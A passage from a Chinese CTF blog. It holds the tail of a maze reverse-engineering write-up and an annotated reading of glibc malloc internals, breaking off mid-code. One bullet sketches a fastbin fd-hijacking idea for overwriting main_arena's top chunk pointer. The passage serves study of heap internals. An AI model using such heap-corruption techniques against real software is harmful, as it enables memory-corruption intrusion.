class="keyword">signed</span> <span class="keyword">int</span> v4; <span class="comment">// edi@4</span></span><br><span class="line">  <span class="keyword">int</span> Y; <span class="comment">// esi@5</span></span><br><span class="line">  <span class="keyword">int</span> X; <span class="comment">// eax@5</span></span><br><span class="line">  <span class="keyword">bool</span> v7; <span class="comment">// zf@5</span></span><br><span class="line">  <span class="keyword">char</span> *v8; <span class="comment">// eax@5</span></span><br><span class="line">  <span class="keyword">char</span> *v9; <span class="comment">// ecx@8</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> result; <span class="comment">// eax@9</span></span><br><span class="line"></span><br><span class="line">  v0 = dword_130FFD8[<span class="number">0</span>];</span><br><span class="line">  v1 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> ( dword_130FFD8[<span class="number">0</span>] != <span class="number">-1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v2 = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">      ++v1;</span><br><span class="line">      *(&amp;byte_1310AA8[<span class="number">22</span> * v0] + dword_130FFDC[v2]) = <span class="number">1</span>;</span><br><span class="line">      v2 = <span class="number">2</span> * v1;</span><br><span class="line">      v0 = dword_130FFD8[<span class="number">2</span> * v1];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> ( v0 != <span class="number">-1</span> );</span><br><span class="line">  &#125;</span><br><span class="line">  v3 = _time64(<span class="number">0</span>);</span><br><span class="line">  srand(v3);</span><br><span class="line">  v4 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">do</span></span><br><span class="line">  &#123;</span><br><span class="line">    Y = rand() % <span class="number">22</span>;</span><br><span class="line">    X = rand();</span><br><span class="line">    Y *= <span class="number">22</span>;</span><br><span class="line">    v7 = *(&amp;byte_1310AA8[Y] + X % <span class="number">22</span>) == <span class="number">-1</span>;</span><br><span class="line">    v8 = &amp;byte_1310AA8[Y] + X % <span class="number">22</span>;</span><br><span class="line">    <span class="keyword">if</span> ( v7 )</span><br><span class="line">    &#123;</span><br><span class="line">      *v8 = <span class="number">1</span>;</span><br><span class="line">      ++v4;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> ( v4 &lt; <span class="number">15</span> );</span><br><span class="line">  v9 = byte_1310AA8;</span><br><span class="line">  <span class="keyword">do</span></span><br><span class="line">  &#123;</span><br><span class="line">    result = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( v9[result] == <span class="number">-1</span> )</span><br><span class="line">        v9[result] = <span class="number">0</span>;</span><br><span class="line">      ++result;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> ( result &lt; <span class="number">22</span> );</span><br><span class="line">    v9 += <span class="number">22</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> ( (<span class="keyword">signed</span> <span class="keyword">int</span>)v9 &lt; (<span class="keyword">signed</span> <span class="keyword">int</span>)&amp;dword_1310C8C );</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>分析函数后发现,函数1跑过后,是如下结果(原本的-1被我替换成了2)</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">.  2  2  2  2  2  2  2  .  2  2  2  2  2  2  .  2  .  2  2  2  .  </span><br><span class="line">.  2  2  2  2  2  2  2  .  2  2  2  2  2  2  .  2  .  2  2  2  .  </span><br><span class="line">.  2  2  2  2  2  2  2  .  2  2  2  2  2  2  .  2  .  2  2  2  .  </span><br><span class="line">.  .  .  .  .  .  .  .  #  .  .  .  .  .  .  .  .  #  .  .  .  .  </span><br><span class="line">.  2  2  2  2  2  2  2  .  2  2  2  2  2  2  .  2  .  2  2  2  .  </span><br><span class="line">.  2  2  2  2  2  2  2  .  2  2  2  2  2  2  .  2  .  2  2  2  .  </span><br><span class="line">.  2  2  2  2  2  2  2  .  2  2  2  2  2  2  .  2  .  2  2  2  .  </span><br><span class="line">.  2  2  2  2  2  2  2  .  2  2  2  2  2  2  .  2  .  2  2  2  .  </span><br><span class="line">.  2  2  2  2  2  2  2  .  2  2  2  2  2  2  .  2  .  2  2  2  .  </span><br><span class="line">.  2  2  2  2  2  2  2  .  2  2  2  2  2  2  .  2  .  2  2  2  .  </span><br><span class="line">.  2  2  2  2  2  2  2  .  2  2  2  2  2  2  .  2  .  2  2  2  .  </span><br><span class="line">.  .  .  .  .  .  .  .  #  .  .  .  .  .  .  #  .  .  .  .  .  .  </span><br><span class="line">.  2  2  2  2  2  2  2  .  2  2  2  2  2  2  .  2  .  2  2  2  .  </span><br><span class="line">.  2  2  2  2  2  2  2  .  2  2  2  2  2  2  .  2  .  2  2  2  .  </span><br><span class="line">.  2  2  2  2  2  2  2  .  2  2  2  2  2  2  .  2  .  2  2  2  .  </span><br><span class="line">.  2  2  2  2  2  2  2  .  2  2  2  2  2  2  .  2  .  2  2  2  .  </span><br><span class="line">.  2  2  2  2  2  2  2  .  2  2  2  2  2  2  .  2  .  2  2  2  .  </span><br><span class="line">.  2  2  2  2  2  2  2  .  2  2  2  2  2  2  .  2  .  2  2  2  .  </span><br><span class="line">.  2  2  2  2  2  2  2  .  2  2  2  2  2  2  .  2  .  2  2  2  .  </span><br><span class="line">#  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  #  .  .  .  .  </span><br><span class="line">.  2  2  2  2  2  2  2  .  2  2  2  2  2  2  .  2  .  2  2  2  .  </span><br><span class="line">.  .  .  .  .  .  .  .  .  .  .  .  .  .  .  #  .  .  .  .  .  #</span><br></pre></td></tr></table></figure>

<p>发现,这就是地图啊,而且只有固定的唯一解,分析函数2后的srand函数和后面赋值函数的作用:</p>
<ul>
<li>随机将2处(也就是memset为-1的数字)随机设置成1(也就是图中的#)然后再遍历地图,将没有涉及到的-1转换成0.</li>
</ul>
<p>真相大白.</p>
<h2 id="国赛re300-GET"><a href="#国赛re300-GET" class="headerlink" title="国赛re300 !GET !"></a>国赛re300 !GET !</h2>
      
    </div>
    <footer class="article-footer">
      <a data-url="http://yoursite.com/2019/07/29/maze/" data-id="cjyn83qfn0036icth92maik6o" class="article-share-link">Share</a>
      
      
    </footer>
  </div>
  
</article>


  
    <article id="post-malloc源码精读总结" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2019/07/29/malloc源码精读总结/" class="article-date">
  <time datetime="2019-07-28T17:11:01.712Z" itemprop="datePublished">2019-07-29</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/PWN/">PWN</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2019/07/29/malloc源码精读总结/">malloc源码精读总结</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <p>之前草草读过一次源码以及华庭的源码分析,最近又有一些生疏了,决定用几周的时间精读一下</p>
<h1 id="一些个人对特性的总结理解"><a href="#一些个人对特性的总结理解" class="headerlink" title="一些个人对特性的总结理解"></a>一些个人对特性的总结理解</h1><h2 id="libc-malloc"><a href="#libc-malloc" class="headerlink" title="__libc_malloc"></a>__libc_malloc</h2><ul>
<li>malloc执行的开始</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> *</span><br><span class="line">__libc_malloc (<span class="keyword">size_t</span> bytes) </span><br><span class="line">&#123;</span><br><span class="line">  mstate ar_ptr;</span><br><span class="line">  <span class="keyword">void</span> *victim;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">void</span> *(*hook) (<span class="keyword">size_t</span>, <span class="keyword">const</span> <span class="keyword">void</span> *) </span><br><span class="line">    = atomic_forced_read (__malloc_hook);</span><br><span class="line">  <span class="keyword">if</span> (__builtin_expect (hook != <span class="literal">NULL</span>, <span class="number">0</span>))</span><br><span class="line">    <span class="keyword">return</span> (*hook)(bytes, RETURN_ADDRESS (<span class="number">0</span>));</span><br></pre></td></tr></table></figure>

<ul>
<li>size_t由系统决定一般情况下64位对应的是long unsigned int,32位为unsigned int,所以传入负数的时候会malloc一块非常大的堆块,这个时候就会触发一些特性</li>
<li>arena_ptr,指向一个arena</li>
<li>给名为hook的函数指针尝试读入<strong>malloc_hook,</strong>malloc_hook是一个调试变量,可以用来打印一些相关参数的值</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">if</span> USE_TCACHE</span></span><br><span class="line">  <span class="comment">/* int_free also calls request2size, be careful to not pad twice.  */</span></span><br><span class="line">  <span class="keyword">size_t</span> tbytes;</span><br><span class="line">  checked_request2size (bytes, tbytes);</span><br><span class="line">  <span class="keyword">size_t</span> tc_idx = csize2tidx (tbytes);</span><br><span class="line"></span><br><span class="line">  MAYBE_INIT_TCACHE ();</span><br><span class="line"></span><br><span class="line">  DIAG_PUSH_NEEDS_COMMENT;</span><br><span class="line">  <span class="keyword">if</span> (tc_idx &lt; mp_.tcache_bins <span class="comment">//大小符合</span></span><br><span class="line">      <span class="comment">/*&amp;&amp; tc_idx &lt; TCACHE_MAX_BINS*/</span> <span class="comment">/* to appease gcc */</span></span><br><span class="line">      &amp;&amp; tcache <span class="comment">//非空</span></span><br><span class="line">      &amp;&amp; tcache-&gt;entries[tc_idx] != <span class="literal">NULL</span>) <span class="comment">//对应位置非空</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">return</span> tcache_get (tc_idx); <span class="comment">//从tcache中返回chunk指针</span></span><br><span class="line">    &#125;</span><br><span class="line">  DIAG_POP_NEEDS_COMMENT;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br></pre></td></tr></table></figure>

<ul>
<li>这里是tcache部分</li>
<li>checked_request2size宏将传入的n转换成符合内存对齐的值,然后计算idx</li>
<li>判断大小符合,tcache非空,对应位置非空</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">if</span> (SINGLE_THREAD_P)<span class="comment">//单线程</span></span><br><span class="line">  &#123;</span><br><span class="line">    victim = _int_malloc (&amp;main_arena, bytes); <span class="comment">//执行_int_malloc</span></span><br><span class="line">    assert (!victim || chunk_is_mmapped (mem2chunk (victim)) ||</span><br><span class="line">     &amp;main_arena == arena_for_chunk (mem2chunk (victim)));</span><br><span class="line">        <span class="comment">//assert判断返回值,以及返回的chunk的arena是不是mainarena来的,以及chunk是不是mmap得到的,同时满足返回指针,指针非mmap返回,反查的arena是mainarena</span></span><br><span class="line">        <span class="keyword">return</span> victim;<span class="comment">//返回chunkptr</span></span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>assert判断返回值,以及返回的chunk的arena是不是mainarena来的,以及chunk是不是mmap得到的,同时满足返回指针,指针非mmap返回,反查的arena是mainarena</li>
<li>随后返回chunkptr</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//下面是线程相关 arena.c定义了arena_get宏,执行会使at_ptr = thread_ptr,然后一些互斥锁balabala</span></span><br><span class="line">  arena_get (ar_ptr, bytes);</span><br><span class="line"><span class="comment">//同样在ar_ptr返回bytes,判断几个条件</span></span><br><span class="line">  victim = _int_malloc (ar_ptr, bytes);</span><br><span class="line">  <span class="comment">/* Retry with another arena only if we were able to find a usable arena</span></span><br><span class="line"><span class="comment">     before.  */</span></span><br><span class="line">  <span class="keyword">if</span> (!victim &amp;&amp; ar_ptr != <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      LIBC_PROBE (memory_malloc_retry, <span class="number">1</span>, bytes);</span><br><span class="line">      ar_ptr = arena_get_retry (ar_ptr, bytes);</span><br><span class="line">      victim = _int_malloc (ar_ptr, bytes);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (ar_ptr != <span class="literal">NULL</span>)</span><br><span class="line">    __libc_lock_unlock (ar_ptr-&gt;mutex);</span><br><span class="line"></span><br><span class="line">  assert (!victim || chunk_is_mmapped (mem2chunk (victim)) ||</span><br><span class="line">          ar_ptr == arena_for_chunk (mem2chunk (victim)));</span><br><span class="line">  <span class="keyword">return</span> victim;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>多线程相关堆分配部分,除了一些互斥锁的加入,大体上还是一样的</li>
</ul>
<h2 id="int-malloc"><a href="#int-malloc" class="headerlink" title="_int_malloc"></a>_int_malloc</h2><ul>
<li>malloc关键的内存管理机制,<code>__libc_malloc</code>总是返回这里,前方高能代码量</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">void</span> *</span><br><span class="line">_int_malloc (mstate av, <span class="keyword">size_t</span> bytes) <span class="comment">//两个参数分别是arena的地址,</span></span><br><span class="line">&#123;</span><br><span class="line">  INTERNAL_SIZE_T nb;               <span class="comment">/* normalized request size */</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> idx;                 <span class="comment">/* associated bin index */</span></span><br><span class="line">  mbinptr bin;                      <span class="comment">/* associated bin */</span></span><br><span class="line"></span><br><span class="line">  mchunkptr victim;                 <span class="comment">/* inspected/selected chunk */</span></span><br><span class="line">  INTERNAL_SIZE_T size;             <span class="comment">/* its size */</span></span><br><span class="line">  <span class="keyword">int</span> victim_index;                 <span class="comment">/* its bin index */</span></span><br><span class="line"></span><br><span class="line">  mchunkptr remainder;              <span class="comment">/* remainder from a split */</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">long</span> remainder_size;     <span class="comment">/* its size */</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> block;               <span class="comment">/* bit map traverser */</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> bit;                 <span class="comment">/* bit map traverser */</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> <span class="built_in">map</span>;                 <span class="comment">/* current word of binmap */</span></span><br><span class="line"></span><br><span class="line">  mchunkptr fwd;                    <span class="comment">/* misc temp for linking */</span></span><br><span class="line">  mchunkptr bck;                    <span class="comment">/* misc temp for linking */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> USE_TCACHE</span></span><br><span class="line">  <span class="keyword">size_t</span> tcache_unsorted_count;	    <span class="comment">/* count of unsorted chunks processed */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/*</span></span><br><span class="line"><span class="comment">     Convert request size to internal form by adding SIZE_SZ bytes</span></span><br><span class="line"><span class="comment">     overhead plus possibly more to obtain necessary alignment and/or</span></span><br><span class="line"><span class="comment">     to obtain a size of at least MINSIZE, the smallest allocatable</span></span><br><span class="line"><span class="comment">     size. Also, checked_request2size traps (returning 0) request sizes</span></span><br><span class="line"><span class="comment">     that are so large that they wrap around zero when padded and</span></span><br><span class="line"><span class="comment">     aligned.</span></span><br><span class="line"><span class="comment">   */</span></span><br></pre></td></tr></table></figure>

<ul>
<li>一些变量的定义,注意传入的两个参数分别为mainarena的地址以及当时传入malloc函数的值,下面称之为av以及bytes</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"> checked_request2size (bytes, nb);<span class="comment">//将传入的值转换成符合条件的nb</span></span><br><span class="line"></span><br><span class="line"> <span class="comment">/* There are no usable arenas.  Fall back to sysmalloc to get a chunk from</span></span><br><span class="line"><span class="comment">    mmap.  */</span></span><br><span class="line"> <span class="keyword">if</span> (__glibc_unlikely (av == <span class="literal">NULL</span>)) <span class="comment">//当传入的arena指针为空的时候执行sysmalloc</span></span><br><span class="line">   &#123;</span><br><span class="line">     <span class="keyword">void</span> *p = sysmalloc (nb, av);</span><br><span class="line">     <span class="keyword">if</span> (p != <span class="literal">NULL</span>)</span><br><span class="line">alloc_perturb (p, bytes);</span><br><span class="line">     <span class="keyword">return</span> p;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line"> <span class="comment">/*</span></span><br><span class="line"><span class="comment">    If the size qualifies as a fastbin, first check corresponding bin.</span></span><br><span class="line"><span class="comment">    This code is safe to execute even if av is not yet initialized, so we</span></span><br><span class="line"><span class="comment">    can try it without checking, which saves some time on this fast path.</span></span><br><span class="line"><span class="comment">  */</span></span><br></pre></td></tr></table></figure>

<ul>
<li>依旧是将传入值变成对齐内存合法的size值,然后判断main_arena是否存在,因为后面的分配是基于此的</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> REMOVE_FB(fb, victim, pp)			\</span></span><br><span class="line">  <span class="keyword">do</span>							\</span><br><span class="line">    &#123;							\</span><br><span class="line">      victim = pp;					\</span><br><span class="line">      <span class="keyword">if</span> (victim == <span class="literal">NULL</span>)				\</span><br><span class="line">	<span class="keyword">break</span>;						\</span><br><span class="line">    &#125;							\</span><br><span class="line">  <span class="keyword">while</span> ((pp = catomic_compare_and_exchange_val_acq (fb, victim-&gt;fd, victim)) \</span><br><span class="line">	 != victim);					\</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (nb) &lt;= (<span class="keyword">unsigned</span> <span class="keyword">long</span>) (get_max_fast ()))<span class="comment">//开始了fastbin部分了,如果在fastbin范围内</span></span><br><span class="line">    &#123;</span><br><span class="line">      idx = fastbin_index (nb); <span class="comment">//按照fastbin的size—index关系计算index</span></span><br><span class="line">      mfastbinptr *fb = &amp;fastbin (av, idx); <span class="comment">//取对应fastbin位置的地址,即mainarena中一个固定偏移的地址,实际上就是对应位的链表头指针</span></span><br><span class="line">      mchunkptr pp;</span><br><span class="line">      victim = *fb; <span class="comment">//victim尝试获取链表头指向的地址</span></span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (victim != <span class="literal">NULL</span>) <span class="comment">//如果存在对应的值,则进入从fastbin中获取堆块的运算,否则进入smallbin的判断</span></span><br><span class="line">	&#123;</span><br><span class="line">	  <span class="keyword">if</span> (SINGLE_THREAD_P) <span class="comment">//如果是单线程,那么直接进行单链表删除节点的操作,链表头写入该节点指向的下一个地址</span></span><br><span class="line">	    *fb = victim-&gt;fd;</span><br><span class="line">	  <span class="keyword">else</span></span><br><span class="line">	    REMOVE_FB (fb, pp, victim);</span><br><span class="line">	  <span class="keyword">if</span> (__glibc_likely (victim != <span class="literal">NULL</span>)) <span class="comment">//判断victim是否为空.</span></span><br><span class="line">	    &#123;</span><br><span class="line">	      <span class="keyword">size_t</span> victim_idx = fastbin_index (chunksize (victim));<span class="comment">//判断该处指向的size是否符合之前的idx</span></span><br><span class="line">	      <span class="keyword">if</span> (__builtin_expect (victim_idx != idx, <span class="number">0</span>))</span><br><span class="line">		malloc_printerr (<span class="string">"malloc(): memory corruption (fast)"</span>);</span><br><span class="line">	      check_remalloced_chunk (av, victim, nb);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> USE_TCACHE</span></span><br><span class="line">	      <span class="comment">/* While we're here, if we see other chunks of the same size,</span></span><br><span class="line"><span class="comment">		 stash them in the tcache.  */</span></span><br><span class="line">	      <span class="keyword">size_t</span> tc_idx = csize2tidx (nb);</span><br><span class="line">	      <span class="keyword">if</span> (tcache &amp;&amp; tc_idx &lt; mp_.tcache_bins)</span><br><span class="line">		&#123;</span><br><span class="line">		  mchunkptr tc_victim;</span><br><span class="line"></span><br><span class="line">		  <span class="comment">/* While bin not empty and tcache not full, copy chunks.  */</span></span><br><span class="line">		  <span class="keyword">while</span> (tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count</span><br><span class="line">			 &amp;&amp; (tc_victim = *fb) != <span class="literal">NULL</span>)</span><br><span class="line">		    &#123;</span><br><span class="line">		      <span class="keyword">if</span> (SINGLE_THREAD_P)</span><br><span class="line">			*fb = tc_victim-&gt;fd;</span><br><span class="line">		      <span class="keyword">else</span></span><br><span class="line">			&#123;</span><br><span class="line">			  REMOVE_FB (fb, pp, tc_victim);</span><br><span class="line">			  <span class="keyword">if</span> (__glibc_unlikely (tc_victim == <span class="literal">NULL</span>))</span><br><span class="line">			    <span class="keyword">break</span>;</span><br><span class="line">			&#125;</span><br><span class="line">		      tcache_put (tc_victim, tc_idx);</span><br><span class="line">		    &#125;</span><br><span class="line">		&#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">	      <span class="keyword">void</span> *p = chunk2mem (victim);</span><br><span class="line">	      alloc_perturb (p, bytes);</span><br><span class="line">	      <span class="keyword">return</span> p;</span><br><span class="line">	    &#125;</span><br><span class="line">	&#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>终于到了熟悉的fastbin阶段了,前面以及后文出现的nb皆为对齐后的size.</li>
<li>按照fastbin的size—index关系计算index</li>
<li>取对应fastbin位置的地址,即mainarena中一个固定偏移的地址,实际上就是对应位的链表头指针</li>
<li>victim尝试获取链表头指向的地址</li>
<li>如果存在对应的值,则进入从fastbin中获取堆块的运算,否则进入smallbin的判断</li>
<li>如果是单线程,那么直接进行单链表删除节点的操作,链表头写入该节点指向的下一个地址<code>(控制这个fd,可日).(两种不同size的fastbin 进行的覆写topchunk指针的操作,关键在与劫持fd,然后在mainarena中写入对应的值.)</code></li>
<li>再次判断分配出来的chunk是否满足idx依旧为当初的idx.</li>
<li>先看endif部分,这是没有tcache情况下的运算,将victim的chunk_ptr转换成user_ptr,然后return.</li>
<li>tcache部分,判断该size还有无剩余chunk,如果有的话,且tcache不是满的情况下,将此类的fastbin_chunk全部归入tcache中</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line">  <span class="comment">/*</span></span><br><span class="line"><span class="comment">     If a small request, check regular bin.  Since these "smallbins"</span></span><br><span class="line"><span class="comment">     hold one size each, no searching within bins is necessary.</span></span><br><span class="line"><span class="comment">     (For a large request, we need to wait until unsorted chunks are</span></span><br><span class="line"><span class="comment">     processed to find best fit. But for small ones, fits are exact</span></span><br><span class="line"><span class="comment">     anyway, so we can check now, which is faster.)</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (in_smallbin_range (nb)) <span class="comment">// 判断是否在smallbin范围</span></span><br><span class="line">    &#123;</span><br><span class="line">      idx = smallbin_index (nb);</span><br><span class="line">      bin = bin_at (av, idx);</span><br><span class="line">    <span class="comment">//根据nb寻找对应index的smallbin的头指针</span></span><br><span class="line">      <span class="keyword">if</span> ((victim = last (bin)) != bin)<span class="comment">//寻找对应smallbin的双向链表的最后一个,如果不等于bin则存在</span></span><br><span class="line">        &#123;</span><br><span class="line">          bck = victim-&gt;bk;</span><br><span class="line">	  <span class="keyword">if</span> (__glibc_unlikely (bck-&gt;fd != victim))</span><br><span class="line">	    malloc_printerr (<span class="string">"malloc(): smallbin double linked list corrupted"</span>);</span><br><span class="line">          set_inuse_bit_at_offset (victim, nb);</span><br><span class="line">          bin-&gt;bk = bck;</span><br><span class="line">          bck-&gt;fd = bin;</span><br><span class="line">            <span class="comment">//删除节点,设置inuse位</span></span><br><span class="line">          <span class="keyword">if</span> (av != &amp;main_arena)</span><br><span class="line">	    set_non_main_arena (victim);</span><br><span class="line">          check_malloced_chunk (av, victim, nb);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> USE_TCACHE</span></span><br><span class="line">    <span class="comment">//tcache部分将此处的所有smallbin归入tcache</span></span><br><span class="line">	  <span class="comment">/* While we're here, if we see other chunks of the same size,</span></span><br><span class="line"><span class="comment">	     stash them in the tcache.  */</span></span><br><span class="line">	  <span class="keyword">size_t</span> tc_idx = csize2tidx (nb);</span><br><span class="line">	  <span class="keyword">if</span> (tcache &amp;&amp; tc_idx &lt; mp_.tcache_bins)</span><br><span class="line">	    &#123;</span><br><span class="line">	      mchunkptr 